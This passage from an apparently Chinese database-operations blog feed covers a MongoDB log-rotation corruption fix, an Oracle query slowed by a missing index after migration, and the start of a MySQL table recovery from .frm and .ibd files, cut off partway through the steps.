<p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/10.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="mongodb日志轮询的问题"><a href="#mongodb日志轮询的问题" class="headerlink" title="mongodb日志轮询的问题"></a>mongodb日志轮询的问题</h3><ol>
<li><code>echo &gt; log</code>会往文件头部插入<code>\n</code>即16进制的<code>0a</code></li>
<li>在数据库正常运行中，对log文件是加了锁的，强制执行<code>echo &gt; log</code>是无法进行覆盖的，会将所有的数据全部置为<code>0</code></li>
<li>强制覆盖后，文件头部变成了无数的空白</li>
</ol>
<h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul>
<li>MongoDB日志轮询方法调整为<strong>kill -SIGUSER1 [mongodpid]</strong></li>
<li>修复目前已经变为图片格式的日志，并拉取15点到16点的日志</li>
</ul>
<p>该case花了一整天，从怀疑被攻击到确认是日志轮询引起文件格式变更是一个关键转折点；</p>
<p>另外PCX格式是第一次碰到，疑惑了半天~最后是@培尧发现了<code>echo</code>的端倪，@衾袭@大宝去验证最终确认了问题的根源。</p>
]]></content>
      <categories>
        <category>技术广角</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>数据救援</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle数据库SQL优化_索引缺失</title>
    <url>/2018/05/29/booboo_others/oracle%E6%95%B0%E6%8D%AE%E5%BA%93SQL%E4%BC%98%E5%8C%96-%E7%B4%A2%E5%BC%95%E7%BC%BA%E5%A4%B1/</url>
    <content><![CDATA[<p>摘要：Oracle数据库做了迁移，从原来的DG迁移到新库RAC，小版本不同；老库中相同的SQL执行只需要11秒，而新库需要360秒甚至800多秒，如何进行复杂查询的SQL优化，本文提供通用的一个思路。</p>
<a id="more"></a>

<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>oracle数据库做了迁移，从原来的DG迁移到新库RAC，小版本不同；</p>
<p>老库中相同的SQL执行只需要11秒，而新库需要360秒甚至800多秒。</p>
<table>
<thead>
<tr>
<th>库</th>
<th>原查询时间</th>
<th>优化后的查询时间</th>
</tr>
</thead>
<tbody><tr>
<td>老库</td>
<td>11秒</td>
<td>1.4秒 缓存后 0.4秒</td>
</tr>
<tr>
<td>新库RAC</td>
<td>360秒</td>
<td>1.4秒 缓存后0.4秒排查思路</td>
</tr>
</tbody></table>
<h2 id="待优化SQL"><a href="#待优化SQL" class="headerlink" title="待优化SQL"></a>待优化SQL</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">	prj.PROVINCE_AD_NAME,</span><br><span class="line">	prj.CITY_AD_NAME,</span><br><span class="line">	prj.AD_NAME,</span><br><span class="line">	prj.CHANNEL_SYS_CAT,</span><br><span class="line">	prj.EXCUTE_EL,</span><br><span class="line">	prj.PRJ_CODE AS PRJ_CODE,</span><br><span class="line">	prj.PRJ_NAME AS PRJ_NAME,</span><br><span class="line">	prj.POS_CODE AS POS_CODE,</span><br><span class="line">	prj.POS_NAME AS POS_NAME,</span><br><span class="line">	prj.CUST_CHANNEL_CODE,</span><br><span class="line">	prj.CUST_CHANNEL_NAME,</span><br><span class="line">	prj.EMP_CODE AS EMP_CODE,</span><br><span class="line">	prj.NAME AS EMP_NAME,</span><br><span class="line">	prj.ATT_DATE AS APPLY_DATE,</span><br><span class="line">	prj.EMP_PK AS EMP_PK,</span><br><span class="line">	prj.ATT_START_TIME AS START_TIME,</span><br><span class="line">	prj.ATT_END_TIME AS END_TIME,</span><br><span class="line">	prj.ATT_ISWORK AS ISWORK,</span><br><span class="line">	prj.ATT_UNWORK AS ATTTYPE,</span><br><span class="line">	prj.START_XPOS AS ON_WORK_POSITION_LON,</span><br><span class="line">	prj.START_YPOS AS ON_WORK_POSITION_LAT,</span><br><span class="line">	prj.START_ISEXCEP AS ON_WORK_POSITION_STAUS,</span><br><span class="line">	prj.END_XPOS AS OFF_WORK_POSITION_LAT,</span><br><span class="line">	prj.END_YPOS AS OFF_WORK_POSITION_LON,</span><br><span class="line">	prj.END_ISEXCEP AS OFF_WORK_POSITION_STAUS,</span><br><span class="line">	ifcl1Staus.COMPARE_TYPE AS FACE_ATT_TYPE,</span><br><span class="line">	ifcl1.STATUS AS FACE_ATT_STATUS,</span><br><span class="line">	NVL( ifaceCount.faceCount, 0 ) AS FACE_ATT_COUNT,</span><br><span class="line">	NVL( levLeave.LEAVECount, 0 ) AS LEAVE_WORK_COUNT,</span><br><span class="line">	NVL( levRtn.RETURNCount, 0 ) AS RETURN_WORK_COUNT,</span><br><span class="line">	wq.STATUS AS PRJ_QUESTION_TYPE,</span><br><span class="line">	iface2.FACE_ATT_IMG AS FACE_ATT_IMG,</span><br><span class="line">	prj.SA_TYPE</span><br><span class="line">FROM</span><br><span class="line">	(</span><br><span class="line">		SELECT</span><br><span class="line">			dpsi.ID AS ID,</span><br><span class="line">			P.ID AS PRJ_ID,</span><br><span class="line">			mad.AD_CODE,</span><br><span class="line">			mad.PROVINCE_AD_NAME,</span><br><span class="line">			mad.CITY_AD_NAME,</span><br><span class="line">			mad.AD_NAME,</span><br><span class="line">			mpk.POS_KIND_CODE,</span><br><span class="line">			mpk.POS_KIND_NAME,</span><br><span class="line">			P.CODE AS PRJ_CODE,</span><br><span class="line">			P.NAME AS PRJ_NAME,</span><br><span class="line">			P.START_DATE,</span><br><span class="line">			p.END_DATE,</span><br><span class="line">			dpsi.CUST_CHANNEL,</span><br><span class="line">			dpsi.CUST_SYS,</span><br><span class="line">			dpsi.CUST_CHANNEL_CODE,</span><br><span class="line">			dpsi.CUST_CHANNEL_NAME,</span><br><span class="line">			dcs.CHANNEL_SYS_CAT,</span><br><span class="line">			dcs.CHANNEL_CAT_CODE,</span><br><span class="line">			dcs.CHANNEL_AD_CODE,</span><br><span class="line">			dcs.CHANNEL_PROVINCE_AD_CODE,</span><br><span class="line">			dcs.CHANNEL_CITY_AD_CODE,</span><br><span class="line">			dcs.ID AS POS_ID,</span><br><span class="line">			dcs.CHANNEL_CODE AS POS_CODE,</span><br><span class="line">			dcs.CHANNEL_NAME AS POS_NAME,</span><br><span class="line">			dcs.LONGITUDE AS LONGITUDE,</span><br><span class="line">			dcs.LATITUDE AS LATITUDE,</span><br><span class="line">			dss.id AS SALES_ID,</span><br><span class="line">			TO_CHAR( cal.sc_schedule_date, 'yyyy-mm-dd' ) AS sc_schedule_date,</span><br><span class="line">			wor.SW_BEGIN_TIME AS SALES_WORK_START,</span><br><span class="line">			wor.SW_END_TIME AS SALES_WORK_END,</span><br><span class="line">			dss.SALES_EAT_START,</span><br><span class="line">			dss.SALES_EAT_END,</span><br><span class="line">			memp.EMP_PK,</span><br><span class="line">			memp.EMP_CODE,</span><br><span class="line">			dss.SALES_NAME AS NAME,</span><br><span class="line">			dss.SALES_PHONE AS TEL,</span><br><span class="line">			dss.SALES_CARD_ID AS ID_CARD,</span><br><span class="line">			spp.PRJ_ATT_CHECK_TYPE,</span><br><span class="line">			spp.ALLOW_LEAVE_TIME,</span><br><span class="line">			e1.EMP_CODE AS EXCUTE_CODE,</span><br><span class="line">			e1.emp_name AS EXCUTE_EL,</span><br><span class="line">			e2.EMP_CODE AS CITY_CODE,</span><br><span class="line">			e2.emp_name AS CITY_EL,</span><br><span class="line">			e3.EMP_CODE AS AREA_CODE,</span><br><span class="line">			e3.EMP_NAME AS AREA_NAME,</span><br><span class="line">			dpsi.SCHEDULE_TYPE,</span><br><span class="line">			sac.ATT_START_TIME,</span><br><span class="line">			sac.ATT_END_TIME,</span><br><span class="line">			sac.ATT_ISWORK,</span><br><span class="line">			sac.ATT_UNWORK,</span><br><span class="line">			sac.START_XPOS,</span><br><span class="line">			sac.START_YPOS,</span><br><span class="line">			DECODE( sac.START_ISEXCEP, 0, 2201, 1, 2202, 2, 2203, 3, 2204, 4, 2205, 2206 ) AS START_ISEXCEP,</span><br><span class="line">			sac.END_XPOS,</span><br><span class="line">			sac.END_YPOS,</span><br><span class="line">			sac.END_ISEXCEP,</span><br><span class="line">			sac.ATT_SCH_PK,</span><br><span class="line">			sac.ATT_DATE,</span><br><span class="line">			CASE</span><br><span class="line">				WHEN sac.ATT_START_TIME IS NOT NULL</span><br><span class="line">				AND sac.ATT_END_TIME IS NOT NULL THEN '1'</span><br><span class="line">				WHEN sac.ATT_START_TIME IS NOT NULL</span><br><span class="line">				OR sac.ATT_END_TIME IS NOT NULL THEN '2'</span><br><span class="line">				ELSE '2'</span><br><span class="line">			END AS SA_TYPE</span><br><span class="line">		FROM</span><br><span class="line">			DM_PROJECT_SELLIN_INFO dpsi</span><br><span class="line">		LEFT JOIN MD_EMP e1 ON</span><br><span class="line">			dpsi.EMP_CODE = e1.EMP_CODE</span><br><span class="line">		LEFT JOIN MD_EMP e2 ON</span><br><span class="line">			dpsi.CITY_EMP_CODE = e2.EMP_CODE</span><br><span class="line">		LEFT JOIN MD_EMP e3 ON</span><br><span class="line">			dpsi.AREA_MANAGER_CODE = e3.EMP_CODE,</span><br><span class="line">			DM_PROJECT P,</span><br><span class="line">			DM_PROJECT_SELLIN_SALES dss,</span><br><span class="line">			DM_CHANNEL_SYNC dcs,</span><br><span class="line">			MD_EMP memp,</span><br><span class="line">			SP_PRJ_PARM spp,</span><br><span class="line">			Md_Admin_Div mad,</span><br><span class="line">			MD_POS_KIND mpk,</span><br><span class="line">			dm_sales_schedule_calendar cal,</span><br><span class="line">			dm_sales_schedule_work wor,</span><br><span class="line">			SP_ATT_SCH sac</span><br><span class="line">		WHERE</span><br><span class="line">			dpsi.PROJECT_ID = P.ID</span><br><span class="line">			AND dss.id = cal.sales_id</span><br><span class="line">			AND cal.schedule_work_id = wor.id</span><br><span class="line">			AND dcs.CHANNEL_CAT_CODE = mpk.POS_KIND_CODE</span><br><span class="line">			AND dss.PROJECT_SELLIN_INFO_ID = dpsi.ID</span><br><span class="line">			AND dss.DELETE_FLAG = '0'</span><br><span class="line">			AND dpsi.CHANNEL_SYNC_ID = dcs.ID</span><br><span class="line">			AND LOWER( memp.EMP_S_CODE )= LOWER( dss.SALES_CARD_ID )</span><br><span class="line">			AND P.IS_DELETE IS NULL</span><br><span class="line">			AND memp.IS_DEL = '0'</span><br><span class="line">			AND spp.PRJ_CODE = P.CODE</span><br><span class="line">			AND mad.AD_ID = dcs.CHANNEL_ADMIN_DIV_ID</span><br><span class="line">			AND mad.IS_DEL = '0'</span><br><span class="line">			AND memp.EMP_TYPE = '1001'</span><br><span class="line">			AND TO_CHAR( cal.sc_schedule_date, 'yyyy-mm-dd' )&gt;='2018-04-01'</span><br><span class="line">			AND TO_CHAR( cal.sc_schedule_date, 'yyyy-mm-dd' )&lt;='2018-04-30'</span><br><span class="line">			AND sac.PRJ_CODE = p.CODE</span><br><span class="line">			AND sac.POS_CODE = dcs.CHANNEL_CODE</span><br><span class="line">			AND sac.EMP_PK = memp.EMP_PK</span><br><span class="line">			AND sac.ATT_DATE = TO_CHAR( cal.sc_schedule_date, 'yyyy-mm-dd' )</span><br><span class="line">			AND TO_CHAR( sac.CRT_DATE, 'yyyy-mm-dd' )&gt;='2018-04-01'</span><br><span class="line">			AND TO_CHAR( sac.CRT_DATE, 'yyyy-mm-dd' )&lt;='2018-04-30'</span><br><span class="line">	) prj,</span><br><span class="line">	(</span><br><span class="line">		SELECT</span><br><span class="line">			ifcl.EMP_PK,</span><br><span class="line">			ifcl.COMPARE_DATE,</span><br><span class="line">			ifcl.STATUS</span><br><span class="line">		FROM</span><br><span class="line">			IPG_FACE_COMPARE_LOG ifcl</span><br><span class="line">		WHERE</span><br><span class="line">			ifcl.HANDLE_TYPE = 0</span><br><span class="line">			AND ifcl.DELETE_FLAG = '0'</span><br><span class="line">			AND ifcl.COMPARE_TYPE IN(</span><br><span class="line">				'1',</span><br><span class="line">				'3',</span><br><span class="line">				'5'</span><br><span class="line">			)</span><br><span class="line">			AND ifcl.COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">			AND ifcl.COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">		GROUP BY</span><br><span class="line">			ifcl.EMP_PK,</span><br><span class="line">			ifcl.COMPARE_DATE,</span><br><span class="line">			ifcl.STATUS</span><br><span class="line">		HAVING</span><br><span class="line">			AVG( STATUS )&lt; 1</span><br><span class="line">	) ifcl1,</span><br><span class="line">	(</span><br><span class="line">		SELECT</span><br><span class="line">			*</span><br><span class="line">		FROM</span><br><span class="line">			(</span><br><span class="line">				SELECT</span><br><span class="line">					EMP_PK,</span><br><span class="line">					COMPARE_DATE,</span><br><span class="line">					COMPARE_TYPE,</span><br><span class="line">					ROW_NUMBER() OVER(</span><br><span class="line">						PARTITION BY EMP_PK,</span><br><span class="line">						COMPARE_DATE</span><br><span class="line">					ORDER BY</span><br><span class="line">						CREATED DESC</span><br><span class="line">					) rn</span><br><span class="line">				FROM</span><br><span class="line">					IPG_FACE_COMPARE_LOG</span><br><span class="line">				WHERE</span><br><span class="line">					COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">					AND COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">					AND COMPARE_TYPE IN(</span><br><span class="line">						'1',</span><br><span class="line">						'3',</span><br><span class="line">						'5'</span><br><span class="line">					)</span><br><span class="line">			) t</span><br><span class="line">		WHERE</span><br><span class="line">			t.rn &lt;= 1</span><br><span class="line">	) ifcl1Staus,</span><br><span class="line">	(</span><br><span class="line">		SELECT</span><br><span class="line">			SP_LEV_RPT.ATT_SCH_PK,</span><br><span class="line">			COUNT(*) AS LEAVECount</span><br><span class="line">		FROM</span><br><span class="line">			SP_LEV_RPT</span><br><span class="line">		WHERE</span><br><span class="line">			SP_LEV_RPT.START_TIME IS NOT NULL</span><br><span class="line">		GROUP BY</span><br><span class="line">			SP_LEV_RPT.ATT_SCH_PK</span><br><span class="line">	) levLeave,</span><br><span class="line">	(</span><br><span class="line">		SELECT</span><br><span class="line">			SP_LEV_RPT.ATT_SCH_PK,</span><br><span class="line">			COUNT(*) AS RETURNCount</span><br><span class="line">		FROM</span><br><span class="line">			SP_LEV_RPT</span><br><span class="line">		WHERE</span><br><span class="line">			SP_LEV_RPT.END_TIME IS NOT NULL</span><br><span class="line">		GROUP BY</span><br><span class="line">			SP_LEV_RPT.ATT_SCH_PK</span><br><span class="line">	) levRtn,</span><br><span class="line">	(</span><br><span class="line">		SELECT</span><br><span class="line">			WX_QUESTION.PRJ_ID,</span><br><span class="line">			DM_PROJECT.CODE,</span><br><span class="line">			'Y' AS STATUS</span><br><span class="line">		FROM</span><br><span class="line">			WX_QUESTION,</span><br><span class="line">			DM_PROJECT</span><br><span class="line">		WHERE</span><br><span class="line">			DM_PROJECT.ID = WX_QUESTION.PRJ_ID</span><br><span class="line">			AND WX_QUESTION.IS_DEL = '0'</span><br><span class="line">			AND WX_QUESTION.STATUS = '0'</span><br><span class="line">		GROUP BY</span><br><span class="line">			WX_QUESTION.PRJ_ID,</span><br><span class="line">			DM_PROJECT.CODE</span><br><span class="line">	) wq,</span><br><span class="line">	(</span><br><span class="line">		SELECT</span><br><span class="line">			ifcl.EMP_PK,</span><br><span class="line">			ifcl.COMPARE_DATE,</span><br><span class="line">			COUNT(*) AS faceCount</span><br><span class="line">		FROM</span><br><span class="line">			IPG_FACE_COMPARE_LOG ifcl</span><br><span class="line">		WHERE</span><br><span class="line">			ifcl.HANDLE_TYPE = 0</span><br><span class="line">			AND ifcl.COMPARE_TYPE IN(</span><br><span class="line">				'1',</span><br><span class="line">				'3',</span><br><span class="line">				'5'</span><br><span class="line">			)</span><br><span class="line">			AND ifcl.COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">			AND ifcl.COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">		GROUP BY</span><br><span class="line">			ifcl.EMP_PK,</span><br><span class="line">			ifcl.COMPARE_DATE</span><br><span class="line">	) ifaceCount,</span><br><span class="line">	(</span><br><span class="line">		SELECT</span><br><span class="line">			iface.EMP_PK,</span><br><span class="line">			iface.COMPARE_DATE,</span><br><span class="line">			wm_concat(</span><br><span class="line">				(</span><br><span class="line">					SELECT</span><br><span class="line">						NVL( TRIM( T.PAR_VALUE ), TRIM( T.OLD_PAR_VALUE ))</span><br><span class="line">					FROM</span><br><span class="line">						(</span><br><span class="line">							SELECT</span><br><span class="line">								(</span><br><span class="line">									SELECT</span><br><span class="line">										PAR_VALUE</span><br><span class="line">									FROM</span><br><span class="line">										MD_SYS_PARM</span><br><span class="line">									WHERE</span><br><span class="line">										PAR_CODE = 'OLD_PIC_PATH'</span><br><span class="line">								) AS OLD_PAR_VALUE,</span><br><span class="line">								PAR_VALUE</span><br><span class="line">							FROM</span><br><span class="line">								MD_SYS_PARM</span><br><span class="line">							WHERE</span><br><span class="line">								PAR_CODE = 'ATT_COS_PATH'</span><br><span class="line">						) T</span><br><span class="line">				)|| REPLACE( SUBSTR( iface.COMPARE_MSG, INSTR( iface.COMPARE_MSG, 'compare', 1, 1 )), ']', '' )</span><br><span class="line">			) AS FACE_ATT_IMG</span><br><span class="line">		FROM</span><br><span class="line">			(</span><br><span class="line">				SELECT</span><br><span class="line">					ifa.EMP_PK,</span><br><span class="line">					ifa.COMPARE_DATE,</span><br><span class="line">					ifa.COMPARE_MSG,</span><br><span class="line">					RANK() OVER(</span><br><span class="line">						PARTITION BY ifa.EMP_PK,</span><br><span class="line">						ifa.COMPARE_DATE</span><br><span class="line">					ORDER BY</span><br><span class="line">						ifa.created DESC</span><br><span class="line">					) rankno</span><br><span class="line">				FROM</span><br><span class="line">					IPG_FACE_COMPARE_LOG ifa</span><br><span class="line">				WHERE</span><br><span class="line">					ifa.HANDLE_TYPE = 0</span><br><span class="line">					AND ifa.COMPARE_TYPE IN(</span><br><span class="line">						'1',</span><br><span class="line">						'3',</span><br><span class="line">						'5'</span><br><span class="line">					)</span><br><span class="line">					AND INSTR( ifa.COMPARE_MSG, 'compare' )&gt; 0</span><br><span class="line">					AND ifa.COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">					AND ifa.COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">			) iface</span><br><span class="line">		WHERE</span><br><span class="line">			iface.rankno &lt;= 3</span><br><span class="line">		GROUP BY</span><br><span class="line">			iface.EMP_PK,</span><br><span class="line">			iface.COMPARE_DATE</span><br><span class="line">	) iface2</span><br><span class="line">WHERE</span><br><span class="line">	prj.PRJ_NAME ='(2013)行政项目'</span><br><span class="line">	AND prj.ATT_DATE &gt;='2018-04-01'</span><br><span class="line">	AND prj.ATT_DATE &lt;='2018-04-30'</span><br><span class="line">	AND prj.EMP_PK = ifcl1.EMP_PK(+)</span><br><span class="line">	AND TO_CHAR( TO_DATE( prj.ATT_DATE, 'yyyy-mm-dd' ), 'yyyymmdd' )= ifcl1.COMPARE_DATE(+)</span><br><span class="line">	AND prj.EMP_PK = ifcl1Staus.EMP_PK(+)</span><br><span class="line">	AND TO_CHAR( TO_DATE( prj.ATT_DATE, 'yyyy-mm-dd' ), 'yyyymmdd' )= ifcl1Staus.COMPARE_DATE(+)</span><br><span class="line">	AND prj.ATT_SCH_PK = levLeave.ATT_SCH_PK(+)</span><br><span class="line">	AND prj.ATT_SCH_PK = levRtn.ATT_SCH_PK(+)</span><br><span class="line">	AND prj.PRJ_CODE = wq.CODE(+)</span><br><span class="line">	AND prj.EMP_PK = ifaceCount.EMP_PK(+)</span><br><span class="line">	AND TO_CHAR( TO_DATE( prj.ATT_DATE, 'yyyy-mm-dd' ), 'yyyymmdd' )= ifaceCount.COMPARE_DATE(+)</span><br><span class="line">	AND prj.EMP_PK = iface2.EMP_PK(+)</span><br><span class="line">	AND TO_CHAR( TO_DATE( prj.sc_schedule_date, 'yyyy-mm-dd' ), 'yyyymmdd' )= iface2.COMPARE_DATE(+)</span><br><span class="line">ORDER BY</span><br><span class="line">	APPLY_DATE DESC,</span><br><span class="line">	ATTTYPE DESC</span><br></pre></td></tr></table></figure>

<h2 id="SQL优化思路"><a href="#SQL优化思路" class="headerlink" title="SQL优化思路"></a>SQL优化思路</h2><p>SQL语句较复杂，8个子查询的left outer join，每个子查询中又有连接。思路如下：</p>
<ol>
<li>从外往内拆分子查询</li>
<li>老旧对比子查询执行计划和执行效率</li>
<li>子查询连接从1到2到3一直到8个联查对比，寻找瓶颈</li>
</ol>
<h3 id="拆分子查询"><a href="#拆分子查询" class="headerlink" title="拆分子查询"></a>拆分子查询</h3><table>
<thead>
<tr>
<th>子查询</th>
<th>老库 （秒）</th>
<th>新库（秒）</th>
</tr>
</thead>
<tbody><tr>
<td>prj</td>
<td>1.182</td>
<td>0.318</td>
</tr>
<tr>
<td>ifcl1</td>
<td>14.229</td>
<td>13.168</td>
</tr>
<tr>
<td>ifclStatus</td>
<td>15.739</td>
<td>16.769</td>
</tr>
<tr>
<td>levLeave</td>
<td>10.147</td>
<td>9.813</td>
</tr>
<tr>
<td>levRtn</td>
<td>9.148</td>
<td>8.3</td>
</tr>
<tr>
<td>wq</td>
<td>0.141</td>
<td>0.165</td>
</tr>
<tr>
<td>ifcl1Count</td>
<td>3.498</td>
<td>1.966</td>
</tr>
<tr>
<td>iface2</td>
<td>49.255</td>
<td>50.897</td>
</tr>
</tbody></table>
<h3 id="寻找瓶颈"><a href="#寻找瓶颈" class="headerlink" title="寻找瓶颈"></a>寻找瓶颈</h3><table>
<thead>
<tr>
<th>连接</th>
<th>老库（秒）</th>
<th>新库（秒）</th>
</tr>
</thead>
<tbody><tr>
<td>prj+ifcl1</td>
<td>1.522</td>
<td>1.129</td>
</tr>
<tr>
<td>+ifclStatus</td>
<td>2.343</td>
<td>1.957</td>
</tr>
<tr>
<td>+levLeave</td>
<td>2.525</td>
<td>1.955</td>
</tr>
<tr>
<td>+levRtn</td>
<td>2.658</td>
<td>1.653</td>
</tr>
<tr>
<td>+wq</td>
<td>2.561</td>
<td>1.999</td>
</tr>
<tr>
<td>+ifcl1Count</td>
<td>3.498</td>
<td>1.966</td>
</tr>
<tr>
<td>+iface2</td>
<td>11.124</td>
<td>383</td>
</tr>
</tbody></table>
<p>发现瓶颈出现在<code>iface2</code></p>
<h2 id="优化iface2"><a href="#优化iface2" class="headerlink" title="优化iface2"></a>优化iface2</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">			iface.EMP_PK,</span><br><span class="line">			iface.COMPARE_DATE,</span><br><span class="line">			wm_concat(</span><br><span class="line">				(</span><br><span class="line">					SELECT</span><br><span class="line">						NVL( TRIM( T.PAR_VALUE ), TRIM( T.OLD_PAR_VALUE ))</span><br><span class="line">					FROM</span><br><span class="line">						(</span><br><span class="line">							SELECT</span><br><span class="line">								(</span><br><span class="line">									SELECT</span><br><span class="line">										PAR_VALUE</span><br><span class="line">									FROM</span><br><span class="line">										MD_SYS_PARM</span><br><span class="line">									WHERE</span><br><span class="line">										PAR_CODE = 'OLD_PIC_PATH'</span><br><span class="line">								) AS OLD_PAR_VALUE,</span><br><span class="line">								PAR_VALUE</span><br><span class="line">							FROM</span><br><span class="line">								MD_SYS_PARM</span><br><span class="line">							WHERE</span><br><span class="line">								PAR_CODE = 'ATT_COS_PATH'</span><br><span class="line">						) T</span><br><span class="line">				)|| REPLACE( SUBSTR( iface.COMPARE_MSG, INSTR( iface.COMPARE_MSG, 'compare', 1, 1 )), ']', '' )</span><br><span class="line">			) AS FACE_ATT_IMG</span><br><span class="line">		FROM</span><br><span class="line">			(</span><br><span class="line">				SELECT</span><br><span class="line">					ifa.EMP_PK,</span><br><span class="line">					ifa.COMPARE_DATE,</span><br><span class="line">					ifa.COMPARE_MSG,</span><br><span class="line">					RANK() OVER(</span><br><span class="line">						PARTITION BY ifa.EMP_PK,</span><br><span class="line">						ifa.COMPARE_DATE</span><br><span class="line">					ORDER BY</span><br><span class="line">						ifa.created DESC</span><br><span class="line">					) rankno</span><br><span class="line">				FROM</span><br><span class="line">					IPG_FACE_COMPARE_LOG ifa</span><br><span class="line">				WHERE</span><br><span class="line">					ifa.HANDLE_TYPE = 0</span><br><span class="line">					AND ifa.COMPARE_TYPE IN(</span><br><span class="line">						'1',</span><br><span class="line">						'3',</span><br><span class="line">						'5'</span><br><span class="line">					)</span><br><span class="line">					AND INSTR( ifa.COMPARE_MSG, 'compare' )&gt; 0</span><br><span class="line">					AND ifa.COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">					AND ifa.COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">			) iface</span><br><span class="line">		WHERE</span><br><span class="line">			iface.rankno &lt;= 3</span><br><span class="line">		GROUP BY</span><br><span class="line">			iface.EMP_PK,</span><br><span class="line">			iface.COMPARE_DATE</span><br></pre></td></tr></table></figure>

<p><code>IPG_FACE_COMPARE_LOG</code>表中<code>COMPARE_DATE列</code>需要新增索引。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>oracle小版本不同引起优化器无法获取相同的执行计划</li>
<li>索引缺失是本次的慢查询的主要原因</li>
</ol>
]]></content>
      <categories>
        <category>技术广角</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL一次惊心动魄地数据强制恢复</title>
    <url>/2018/05/17/booboo_others/MySQL%E4%B8%80%E6%AC%A1%E6%83%8A%E5%BF%83%E5%8A%A8%E9%AD%84%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BC%BA%E5%88%B6%E6%81%A2%E5%A4%8D/</url>
    <content><![CDATA[<p>摘要：Cash恢复的正确方式是：<strong>备份文件（逻辑或物理）+ binlog</strong>进行恢复；然而并不是所有的运维人员都知道怎么进行正确的备份，甚至连逻辑备份和物理备份的区别是什么都不知道？更不知道备份过程中需要考虑数据的一致性与服务可用性的问题？或者连备份工具都不会使用，所以当你问：有备份吗？回答：没有或者无效</p>
<p>在本次案例中，某客户数据库因存储空间不够导致数据库服务宕掉，而客户在数据库宕机后，只拷贝了单个<code>cy</code>库所属的目录进行了文件层面的备份，就将其他文件全部清空，当他想重新启动数据库时发现数据库服务启动。MySQL使用5.7.17版本，使用innodb存储引擎，开启了独立表空间。也就是说当前的救命稻草是：每个表的<code>.frm</code>和<code>.ibd</code>文件。</p>
<a id="more"></a>

<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>Cash恢复的正确方式是：<strong>备份文件（逻辑或物理）+ binlog</strong>进行恢复；然而并不是所有的运维人员都知道怎么进行正确的备份，甚至连逻辑备份和物理备份的区别是什么都不知道？更不知道备份过程中需要考虑数据的一致性与服务可用性的问题？或者连备份工具都不会使用，所以当你问：有备份吗？回答：没有或者无效</p>
<p>在本次案例中，某客户只对单个<code>cy</code>库所属的目录进行了文件层面的备份，MySQL使用5.7.17版本，使用innodb存储引擎，开启了独立表空间。也就是说当前的救命稻草是：每个表的<code>.frm</code>和<code>.ibd</code>文件。</p>
<h2 id="强制还原步骤"><a href="#强制还原步骤" class="headerlink" title="强制还原步骤"></a>强制还原步骤</h2><table>
<thead>
<tr>
<th>步骤</th>
<th>描述</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><strong>创建同版本的MySQL服务实例一枚</strong></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td><strong>获取表的列数</strong></td>
<td>如果有ddl备份直接导入，可惜都是没有的，哭。。。</td>
</tr>
<tr>
<td>2.1</td>
<td>创建同名表，结构无所谓</td>
<td>数据库的世界也需要身份证，先造个人拿上身份证，至于人长得啥样几条胳膊都无所谓，名字最重要</td>
</tr>
<tr>
<td>2.2</td>
<td>停服务；使用备份的frm文件覆盖当前的frm</td>
<td>偷梁换柱</td>
</tr>
<tr>
<td>2.3</td>
<td>配置文件添加强制恢复innodb的参数；启动服务</td>
<td>蒙蔽她的双眼</td>
</tr>
<tr>
<td>2.4</td>
<td>查看表结构</td>
<td>数据库会拿着身份证和面前的人（frm文件）做对比</td>
</tr>
<tr>
<td>2.5</td>
<td>查看错误日志中关于该表的报错</td>
<td>数据库发现身份证上的人只有1条胳膊，而被检查的人有10条胳膊，明显对不上啊</td>
</tr>
<tr>
<td>2.6</td>
<td>成功获取表的真实列数；删除这些表</td>
<td>通过警告可以知道应该造一个有10条胳膊的人</td>
</tr>
<tr>
<td>3</td>
<td><strong>获取表的结构</strong></td>
<td></td>
</tr>
<tr>
<td>3.1</td>
<td>创建同名表，列数一致，列名无所谓</td>
<td>这一次造人的时候，造一个有10条胳膊的，每条胳膊的名字无所谓，关键是身份证上面的人名和10条胳膊</td>
</tr>
<tr>
<td>3.2</td>
<td>停服务；使用备份的frm文件覆盖当前的frm</td>
